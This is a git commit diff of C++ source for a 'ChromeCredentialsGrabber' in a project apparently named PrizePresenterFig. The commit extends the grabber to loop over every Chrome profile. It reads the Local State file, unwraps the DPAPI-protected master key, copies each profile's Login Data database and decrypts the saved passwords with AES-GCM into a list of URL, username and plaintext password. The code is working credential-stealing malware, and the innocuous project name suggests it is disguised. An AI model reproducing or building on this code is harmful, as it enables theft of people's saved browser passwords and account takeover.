cb46bb381ac12359430d6f11ec3dabd7761cc0b5
Gil Alpert <87145166+gilgoolon@users.noreply.github.com>
2025-06-15 17:15:20 +0300

    ChromeGrabber: grab all profiles and clean

--- PrizePresenterFig/PrizePresenterFig/Grabbers/ChromeCredentialsGrabber.cpp
+++ PrizePresenterFig/PrizePresenterFig/Grabbers/ChromeCredentialsGrabber.cpp
@@ -2,6 +2,7 @@
 
 #include "Exception.hpp"
 #include "Json.hpp"
+#include "Trace.hpp"
 #include "Crypto/Aes.hpp"
 #include "Crypto/Base64.hpp"
 #include "Crypto/Protection.hpp"
@@ -15,13 +16,9 @@
 
 #include <filesystem>
 
-static Buffer parse_key(const std::string& encrypted_key)
+std::wstring ChromeCredentialsGrabber::source() const
 {
-	const Buffer key_with_prefix = Base64::decode(encrypted_key);
-	static constexpr std::string_view PREFIX = "DPAPI";
-
-	const Buffer protected_key = {key_with_prefix.begin() + PREFIX.size(), key_with_prefix.end()};
-	return Crypto::unprotect_data(protected_key);
+	return L"Chrome";
 }
 
 static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
@@ -45,52 +42,93 @@ static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
 
 std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
 {
-	const std::filesystem::path chrome_root_folder = Environment::expand_variables(CHROME_ROOT_FOLDER);
-	const std::filesystem::path user_data_folder = chrome_root_folder / L"User Data";
-	const std::filesystem::path login_data_db_path = user_data_folder / L"Default" / L"Login Data";
-	const std::filesystem::path local_state_path = user_data_folder / L"Local State";
-
-	const InMemorySqliteDatabase login_data_db(
-		TemporaryFile(login_data_db_path).read()
-	);
-	const Json local_state = Json::parse(
-		TemporaryFile(local_state_path).read()
-	);
-
-	const auto aes_key = parse_key(local_state["os_crypt"]["encrypted_key"].get<std::string>());
+	const std::filesystem::path chrome_root = get_local_chrome_path();
+	const LocalState local_state = LocalState::from_chrome_root(chrome_root);
+	const auto aes_key = local_state.get_master_key();
 
 	Credentials credentials;
 
-	for (SqliteRowIterator iterator = login_data_db.iterate_query(
-		     "SELECT origin_url, username_value, password_value FROM logins"
-	     );
-	     iterator.next();)
+	for (const std::wstring& profile : local_state.get_user_profiles())
 	{
-		const SqliteRow row = iterator.current();
-		const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, Buffer>(
-			row
+		const auto login_data_db = InMemorySqliteDatabase(
+			TemporaryFile(get_login_data_path(chrome_root, profile)).read()
 		);
 
-		if (password_value.empty())
+		for (SqliteRowIterator iterator = login_data_db.iterate_query(
+			     "SELECT origin_url, username_value, password_value FROM logins"
+		     );
+		     iterator.next();)
 		{
-			continue;
+			const SqliteRow row = iterator.current();
+			const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, Buffer>(
+				row
+			);
+
+			if (password_value.empty())
+			{
+				continue;
+			}
+
+			auto [iv, encrypted_password] = parse_password(password_value);
+
+			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);
+
+			credentials.emplace_back(
+				origin_url,
+				username_value,
+				Strings::to_wstring(Strings::to_string(plaintext_password))
+			);
 		}
-
-		auto [iv, encrypted_password] = parse_password(password_value);
-
-		const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);
-
-		credentials.emplace_back(
-			origin_url,
-			username_value,
-			Strings::to_wstring(Strings::to_string(plaintext_password))
-		);
 	}
 
 	return credentials;
 }
 
-std::wstring ChromeCredentialsGrabber::source() const
+std::filesystem::path ChromeCredentialsGrabber::get_local_chrome_path()
 {
-	return L"Chrome";
+	return Environment::expand_variables(CHROME_ROOT_FOLDER);
+}
+
+std::filesystem::path ChromeCredentialsGrabber::get_user_data_path(const std::filesystem::path& chrome_root)
+{
+	return chrome_root / "User Data";
+}
+
+std::filesystem::path ChromeCredentialsGrabber::get_local_state_path(const std::filesystem::path& chrome_root)
+{
+	return get_user_data_path(chrome_root) / L"Local State";
+}
+
+std::filesystem::path ChromeCredentialsGrabber::get_login_data_path(const std::filesystem::path& chrome_root,
+                                                                    const std::wstring& profile)
+{
+	return get_user_data_path(chrome_root) / profile / L"Login Data";
+}
+
+ChromeCredentialsGrabber::LocalState::LocalState(Json local_state):
+	m_local_state(std::move(local_state))
+{
+}
+
+std::vector<std::wstring> ChromeCredentialsGrabber::LocalState::get_user_profiles() const
+{
+	const Json profiles_order = m_local_state["profile"]["profiles_order"];
+	std::vector<std::wstring> result;
+	std::ranges::transform(profiles_order, std::back_inserter(result), get_wstring);
+	return result;
+}
+
+Buffer ChromeCredentialsGrabber::LocalState::get_master_key() const
+{
+	const Buffer key_with_prefix = Base64::decode(m_local_state["os_crypt"]["encrypted_key"].get<std::string>());
+	static constexpr std::string_view PREFIX = "DPAPI";
+
+	const Buffer protected_key = {key_with_prefix.begin() + PREFIX.size(), key_with_prefix.end()};
+	return Crypto::unprotect_data(protected_key);
+}
+
+ChromeCredentialsGrabber::LocalState ChromeCredentialsGrabber::LocalState::from_chrome_root(
+	const std::filesystem::path& chrome_root)
+{
+	return LocalState(Json::parse(TemporaryFile(get_local_state_path(chrome_root)).read()));
 }
--- PrizePresenterFig/PrizePresenterFig/Grabbers/ChromeCredentialsGrabber.hpp
+++ PrizePresenterFig/PrizePresenterFig/Grabbers/ChromeCredentialsGrabber.hpp
@@ -1,5 +1,8 @@
 ﻿#pragma once
 #include "CredentialsGrabber.hpp"
+#include "Json.hpp"
+
+#include <filesystem>
 
 class ChromeCredentialsGrabber final : public CredentialsGrabber
 {
@@ -16,4 +19,29 @@ public:
 
 private:
 	static constexpr auto CHROME_ROOT_FOLDER = L"%LOCALAPPDATA%/Google/Chrome/";
+
+	[[nodiscard]] static std::filesystem::path get_local_chrome_path();
+	[[nodiscard]] static std::filesystem::path get_user_data_path(const std::filesystem::path& chrome_root);
+	[[nodiscard]] static std::filesystem::path get_local_state_path(const std::filesystem::path& chrome_root);
+	[[nodiscard]] static std::filesystem::path get_login_data_path(const std::filesystem::path& chrome_root,
+	                                                               const std::wstring& profile);
+
+	class LocalState final
+	{
+	public:
+		explicit LocalState(Json local_state);
+		~LocalState() = default;
+		LocalState(const LocalState&) = delete;
+		LocalState& operator=(const LocalState&) = delete;
+		LocalState(LocalState&&) = delete;
+		LocalState& operator=(LocalState&&) = delete;
+
+		[[nodiscard]] std::vector<std::wstring> get_user_profiles() const;
+		[[nodiscard]] Buffer get_master_key() const;
+
+		[[nodiscard]] static LocalState from_chrome_root(const std::filesystem::path& chrome_root);
+
+	private:
+		Json m_local_state;
+	};
 };
